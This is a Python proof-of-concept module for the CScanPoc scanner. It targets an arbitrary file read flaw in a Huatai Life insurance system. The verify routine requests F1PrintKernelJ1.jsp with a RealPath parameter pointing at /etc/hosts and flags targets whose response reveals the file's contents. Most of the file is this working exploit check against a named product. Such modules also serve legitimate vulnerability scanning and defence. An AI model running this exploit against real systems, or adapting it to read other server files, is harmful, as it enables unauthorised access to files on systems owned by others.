# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Huatai_0000'  # 平台漏洞编号
    name = '华泰人寿系统存在任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2016-02-07'  # 漏洞公布时间
    desc = '''
        华泰人寿系统存在任意文件读取漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # https://wooyun.shuimugan.com/bug/view?bug_no=164486
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华泰人寿'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '064f0676-163f-4a2b-bf65-59444403ddf0'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/ui/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts'
            response = requests.get(vul_url)
            if response.status_code == 200 and '127.0.0.1' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
